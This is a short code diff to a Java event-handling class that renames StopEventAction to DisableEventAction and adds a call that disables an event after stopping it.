@@ -1,17 +1,15 @@
 package com.android.service.action;
 
-import org.json.JSONObject;
-
 import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.manager.ManagerEvent;
 import com.android.service.util.Check;
 
-public class StopEventAction extends EventAction {
-	private static final String TAG = "StopEventAction";
+public class DisableEventAction extends EventAction {
+	private static final String TAG = "DisableEventAction";
 
-	public StopEventAction(ConfAction params) {
+	public DisableEventAction(ConfAction params) {
 		super(params);
 	}
 
@@ -20,9 +18,12 @@ public class StopEventAction extends EventAction {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute): " + eventId);//$NON-NLS-1$
 		}
+		
 		final ManagerEvent eventManager = ManagerEvent.self();
 
 		eventManager.stop(eventId);
+		eventManager.disable(eventId);
+		
 		return true;
 	}
 
